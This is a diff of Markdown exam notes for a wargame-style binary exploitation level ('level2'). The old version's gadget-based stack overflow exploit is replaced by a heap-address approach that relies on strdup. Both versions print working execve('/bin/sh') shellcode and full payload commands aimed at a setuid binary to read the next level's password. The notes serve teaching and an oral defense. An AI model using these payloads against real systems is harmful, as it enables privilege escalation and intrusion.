@@ -1,146 +1,133 @@
-# Level2 - Exam Notes
+# Level 2 — Exam Notes
 
 ## 1. Objective
-Get a level3 shell. The binary is setuid level3; no system in the normal flow. You need to execute shellcode (e.g. execve("/bin/sh")).
 
-## 2. Initial diagnosis (before GDB)
-- **Suspicious functions:** `gets` in `p()`; no system. Buffer at ebp-0x4c, reads the return address then checks `(ret & 0xb0000000) == 0xb0000000` → if true, exit. So no direct return to the stack (0xb... addresses).
-- **User input:** everything that gets reads into the buffer; no bound.
-- **Success:** execute shellcode (e.g. execve("/bin/sh")); the shellcode must be in the buffer, but we can't put 0xb... as the ret. A gadget is needed (e.g. pop; ret) to make a second jump into the buffer.
-- **Hypothesis:** buffer overflow; return to a gadget in the binary, then two words = buffer address so that the gadget's ret jumps to the buffer (shellcode).
+Get a level3 shell. The binary is setuid level3; no `system` in the normal flow. You need to execute shellcode (`execve("/bin/sh")`).
 
-## 3. GDB diagnosis (how the vulnerability was found)
-- **Where to break:** in `p`, after gets (or before p's ret). Goal: measure the offset and confirm the gadget.
-- **Stack layout:** buffer at `ebp-0x4c` → 76 bytes to saved EBP, +4 = **80 bytes** to the return address. `x/24wx $ebp-0x4c` to see buffer, EBP, ret.
-- **Offset:** 80 bytes (calculated: 0x4c + 4). Verification: send 80 bytes + 0x42424242; segfault at 0x42424242 confirms.
-- **Gadget:** in the binary, look for `pop reg; ret` (e.g. objdump -d | grep -A1 pop). **0x08048385**: `pop ebx; ret`. By returning here: pop consumes the first word (we put the buffer address), ret jumps to the second word (also the buffer address) → execution of code at the start of the buffer.
-- **Buffer address:** the **exact** address of `buf` (start of the 76-byte area at `ebp-0x4c`) must match the two words after the gadget. It **changes** with environment size, `argv`, and whether stdin is a pipe vs TTY — an address seen only in a “bare” `run` in GDB can differ from `( python -c '...'; cat ) | ./level2`. Typical range on the subject VM: **0xbffff5e0–0xbffff750** (examples: `0xbffff6c0`, `0xbffff700`). **Do not guess:** measure under conditions close to the real exploit (see below).
-- **Flow control:** payload = [NOP sled optional][shellcode][padding to 80][0x08048385][buf_addr][buf_addr]. At p's ret → gadget; pop consumes buf_addr; ret jumps to buf_addr → execution at **buf[0]** (NOPs or first byte of shellcode).
+---
 
-**Byte budget (before overwriting saved EIP):** exactly **80 bytes** from `buf[0]`. So **`NOP×N + len(shellcode) + len(pad) = 80`**. With **NOP = 40**: max shellcode length is **40** bytes; e.g. **28-byte** shellcode → **12** bytes `A` padding; **30-byte** (buffer-i386-cool) → **10** bytes `A`. See **`level2/Ressources/shellcode.md`**.
+## 2. Initial Diagnosis (before GDB)
 
-**Why 28 bytes for the default shellcode?** Not a Rainfall rule — it is the **encoded size** of the chosen stub: [Shell-Storm shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira), `execve("/bin/sh")` then `exit`-via-syscall. Each instruction contributes a fixed number of bytes (sum = **28**). Full disassembly and explanation: **`level2/Ressources/shellcode.md`**.
+| Property | Detail |
+|----------|--------|
+| Vulnerable function | `gets` in `p()` |
+| Buffer location | `ebp - 0x4c` |
+| No bounds check | `gets` reads unlimited input |
+| Stack check | `(ret & 0xb0000000) == 0xb0000000` → exits if stack address |
+| Key observation | `strdup(buf)` copies the buffer to the heap after the check |
 
-### 3.1 GDB — recover `buf` for `./level2.bin` (or `./level2`)
+- **Vulnerability:** `gets` writes unlimited input into a 76-byte buffer → buffer overflow
+- **Obstacle:** the program checks the return address — if it starts with `0xb` (stack address) it calls `_exit(1)`
+- **Bypass:** heap addresses start with `0x08`, not `0xb` → pass the check naturally
+- **Plan:** put shellcode at the start of the buffer, overwrite return address with the heap address where `strdup` copies it → shellcode executes from the heap
 
-**Why “Illegal instruction”?** After the gadget, EIP is set to the address you placed. If it is **wrong**, the CPU runs **padding** (`0x41` = `'A'`) or **misaligned bytes inside the shellcode** → invalid opcodes → **SIGILL**. Wrong buffer address is the usual cause.
+---
 
-**Recon (local):** `file level2.bin` → 32-bit ELF. `readelf -l level2.bin | grep GNU_STACK` — if stack is not RWX, shellcode on stack would fault differently; on Rainfall it is usually executable.
+## 3. GDB Diagnosis
 
-**Steps (reproducible):**
+### Stack layout
 
-1. `gdb -q ./level2` (or `./level2.bin`).
-2. `disas p` → find the instruction **immediately after** `call gets` (e.g. `0x080484xx`).
-3. `break *0x080484xx` (replace with your address).
-4. Feed input **without** a newline until you are ready: `gets` reads a line; use a long printable pattern from a file or:  
-   `run < <(python -c 'print "A"*120')`  
-   (Python 2 on VM; under GDB this approximates a pipe and keeps the stack closer to the real exploit than typing at the prompt.)
-5. When the breakpoint hits (after `gets` returns):  
-   `p/x $ebp-0x4c`  
-   `x/24wx $ebp-0x4c`  
-   The address printed by `p/x $ebp-0x4c` is **`&buf`** — use it as the two 32-bit words after the gadget (little-endian in the payload).
-6. Optional: compare with `run` **without** `< <(...)` once — if the address differs, prefer the method that matches how you launch the real exploit (`| ./level2`).
-
-**Record** the value in your notes; update the last 8 bytes of the payload (`buf` twice) accordingly.
-
-### 3.2 GDB — checklist if the exploit still SIGILL (verify on `./level2.bin`)
-
-Do **not** trust example addresses (`0xbffff700`, `0x08048385`) until they match **your** file.
-
-1. **ASLR inside GDB** (stable `&buf` between runs):  
-   `set disable-randomization on`  
-   (Outside GDB, Rainfall VM is often fixed anyway; inside GDB randomization can still change addresses.)
-
-2. **Gadget address** (must match **your** binary):  
-   `objdump -d ./level2.bin | grep -B1 ret`  
-   Find a `pop` + `ret` (e.g. `pop ebx; ret`). Note the **exact** address — if it is not `0x08048385`, replace `\x85\x83\x04\x08` in the payload.
-
-3. **Measure `&buf` again** with the same stdin pattern you use for the real run, e.g.  
-   `run < <(python -c 'print "A"*120')`  
-   then `p/x $ebp-0x4c`.  
-   Encode that value (little-endian) **twice** at the end of the payload — do not reuse an example from the subject without this step.
-
-4. **Confirm execution reaches the buffer** (with randomization off):  
-   Let `ADDR` = value from `p/x $ebp-0x4c`.  
-   `break *ADDR`  
-   `run < <(python -c '...full payload with ADDR encoded...')`  
-   If GDB **never** hits this breakpoint, the jump does not land on `buf[0]` → wrong `ADDR`, wrong gadget, or wrong offset (80).
-
-5. **Inspect EIP at crash** (optional):  
-   `run` … then if it SIGILL: `info registers eip` — compare `eip` to `ADDR` and to `x/16bx ADDR` (misaligned start vs NOP/shellcode).
-
-6. **Python**: use the same interpreter as on the VM (`python` vs `python2`). If `python` is Python 3, the one-liner syntax must use `print(...)`.
-
-**Note:** `pwd` typed after `puts` output does **not** prove a shell — the subshell `(python; cat) | ./level2` still has **`cat`** feeding stdin after the exploit; focus on GDB proving `break *ADDR` and a correct gadget first.
-
-## 4. Building the exploit command
-- **Shellcode (default):** [Shell-Storm — Linux/x86 execve `/bin/sh`, 28 bytes](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira); **alternative:** [buffer-i386-cool.c](https://github.com/buffer/shellcodes/blob/master/buffer-i386-cool.c) (**30 bytes**). **See `level2/Ressources/shellcode.md`** for disassembly, why **28** bytes, and byte budget.
-- **Target:** after **80** bytes, saved EIP = gadget `0x08048385`; next two stack words = **`&buf`** (same value twice), little-endian.
-- **Layout (28-byte shellcode):** [`\x90` × 40][shellcode 28][`A` × 12][gadget LE][`&buf` LE][`&buf` LE]. `pad = 80 - 40 - 28 = 12`.
-- **Working command (Python 2 on VM, `struct.pack`):** same as **`level2/old/commands.md`** — adjust `buf_addr` if SIGILL.
-
-```bash
-( python -c '
-import struct
-NOP = "\x90"
-shellcode = (
-    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
-    "\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-)
-nopsled = NOP * 40
-pad = 80 - len(nopsled) - len(shellcode)
-buf_addr = 0xbffff700
-gadget = 0x08048385
-payload = nopsled + shellcode + "A"*pad + struct.pack("<I", gadget) + struct.pack("<I", buf_addr) + struct.pack("<I", buf_addr)
-print payload
-'; cat ) | ./level2
+```
+[ buffer — 76 bytes ][ saved EBP — 4 bytes ][ return address — 4 bytes ]
+  ebp - 0x4c                                  ← overwrite target
 ```
 
-- **Addresses to try** if SIGILL or no shell: `0xbffff5e0`, `0xbffff600`, `0xbffff650`, `0xbffff6a0`, `0xbffff6c0`, `0xbffff700`, `0xbffff750` — or **`p/x $ebp-0x4c`** after `gets` (section 3.1).
-- **One-liner generator:** `python3 level2/Ressources/converter.py` — set `BUFFER_ADDR` to match GDB.
+**Offset to return address:** `0x4c + 4 = 80 bytes`
 
-## 5. Exploitation logic
-Overflow via `gets()`; the program rejects a saved EIP in `0xb0000000` range. Return to `pop; ret` at `0x08048385`, stack holds `&buf` twice so the second `ret` jumps to the buffer. NOP sled → shellcode → shell. Details: **`shellcode.md`**, **`old/commands.md`**.
+> Verification: send 80 bytes + `\x42\x42\x42\x42` → segfault at `0x42424242` confirms offset.
 
-## 6. Reproducible procedure (for evaluation)
-- **Command (28-byte shellcode — copy-paste to test; change `buf_addr` if GDB differs):**
+### Finding the heap address
 
-```bash
-( python -c '
-import struct
-NOP = "\x90"
-shellcode = (
-    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
-    "\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-)
-nopsled = NOP * 40
-pad = 80 - len(nopsled) - len(shellcode)
-buf_addr = 0xbffff700
-gadget = 0x08048385
-payload = nopsled + shellcode + "A"*pad + struct.pack("<I", gadget) + struct.pack("<I", buf_addr) + struct.pack("<I", buf_addr)
-print payload
-'; cat ) | ./level2
-```
-
-- **One-liner (same payload, `buf_addr` = 0xbffff700):** `python3 level2/Ressources/converter.py` or:
+Set a breakpoint right after `strdup` returns, at the `leave` instruction:
 
 ```bash
-( python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*12 + "\x85\x83\x04\x08" + "\x00\xf7\xff\xbf"*2'; cat ) | ./level2
+(gdb) b *0x0804853d
+(gdb) run
+AAAA
+(gdb) p/x $eax
+$1 = 0x804a008
 ```
 
-- **If SIGILL:** wrong `&buf` (section 3.1–3.2) or try the address list in section 4.
-- **Expected result:** level3 shell. Then `cat /home/user/level3/.pass`.
-- **What to say:** "gets() overflow. The program rejects a ret at 0xb..., so I return to a pop;ret gadget and put the buffer address twice to jump to the shellcode."
+- `$eax` holds the return value of `strdup` = the heap address where our buffer was copied
+- `0x0804a008` starts with `0x08` → **passes the check**
+- ASLR is disabled on this VM → this address is stable across runs
 
-## 7. Oral defense points
-- **Bug:** gets() in p() without a bound; stack overflow.
-- **Constraint:** ret & 0xb0000000 → exit; no direct return to the buffer.
-- **GDB:** offset 80, gadget 0x08048385, **`&buf` from `p/x $ebp-0x4c` after `gets`** (not a “typical” guess).
-- **Fix:** replace gets with fgets with a bounded size.
+### Flow control
 
-## 8. Common evaluator questions
-- **Why a gadget?** The buffer address is 0xb...; the program exits if ret is in that range. The gadget is at 0x08...; the gadget's ret reads the next value on the stack (our buffer address) and jumps there.
-- **What does the gadget do?** pop consumes one word (we put the buffer address), ret jumps to the next word (also the buffer address) → buffer execution.
-- **How do you find the buffer address?** Break after `gets` in `p`, then `p/x $ebp-0x4c`. Prefer `run < <(python -c 'print "A"*120')` so the stack is closer to the piped exploit; the address can differ from an interactive `run`.
-- **Shellcode without NUL?** gets stops at \n; and a NUL would cut strdup/display; a classic shellcode without NUL avoids truncation.
-- **Why is the shellcode exactly 28 bytes?** It is the size of the [shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html) machine-code sequence (sum of instruction encodings), not a level-specific constant — see **`shellcode.md`**.
+```
+gets() fills buffer with:
+  [shellcode][padding][0x0804a008]
+        ↓
+check: 0x0804a008 & 0xb0000000 = 0x00000000 ≠ 0xb0000000 → passes
+        ↓
+strdup() copies buffer to heap at 0x0804a008
+  → shellcode is now on the heap
+        ↓
+return → CPU jumps to 0x0804a008
+  → shellcode executes → /bin/sh spawns
+```
+
+---
+
+## 4. Building the Exploit
+
+### Payload structure
+
+```
+[ shellcode — 28 bytes ][ padding A × 52 ][ 0x0804a008 little-endian ]
+        28              +       52        +          4               = 84 bytes
+```
+
+- First 80 bytes fill the buffer (76) + saved EBP (4)
+- Last 4 bytes overwrite the return address with the heap address
+
+### Address encoding (little-endian)
+
+```
+0x0804a008 → \x08\xa0\x04\x08
+```
+
+### Shellcode used (28 bytes — execve("/bin//sh"))
+https://shell-storm.org/shellcode/files/shellcode-811.html
+
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x89\xe3\x89
+\xc1\x89\xc2\xb0\x0b\xcd\x80\x31
+\xc0\x40\xcd\x80
+```
+
+---
+
+## 5. Exploit Command
+
+```bash
+(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08"'; cat) | ./level2
+```
+
+> `( ...; cat )` keeps stdin open so the spawned shell stays alive.
+
+---
+
+## 6. Expected Result
+
+```bash
+$ whoami
+level3
+$ cat /home/user/level3/.pass
+<flag>
+```
+
+---
+
+## 7. Summary
+
+| Step | What happens |
+|------|-------------|
+| `gets()` | Reads our crafted input into 76-byte buffer — no bounds check |
+| Overflow | Padding overwrites saved EBP and return address with `0x0804a008` |
+| Check | `0x0804a008` starts with `0x08` → not a stack address → passes |
+| `strdup()` | Copies our buffer (shellcode included) to heap at `0x0804a008` |
+| `return` | CPU jumps to `0x0804a008` → executes shellcode → shell spawns |
+
+**Key insight:** we do not fight the stack check — we use the heap. `strdup` copies our shellcode there automatically. We just point the return address at it.
